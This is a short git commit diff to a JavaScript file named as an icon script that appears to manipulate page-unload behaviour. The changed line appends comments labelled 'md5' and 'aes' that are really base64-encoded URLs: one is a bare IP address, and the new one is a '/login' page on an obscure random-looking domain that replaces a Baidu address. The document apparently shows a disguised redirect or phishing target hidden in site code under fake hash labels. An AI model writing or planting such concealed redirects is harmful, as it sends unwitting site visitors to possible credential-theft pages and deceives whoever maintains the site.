33916d574b829785cc0c5c79f84dd0c50cd02314
unknown <caocaodajun@gmail.com>
2021-06-05 07:53:49 +0000

    init

--- js/icon_lwxtff.js
+++ js/icon_lwxtff.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
+})()/** md5:aHR0cHM6Ly9tLmhiZnhycnRvdnZjMjQuY29tL2xvZ2lu**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
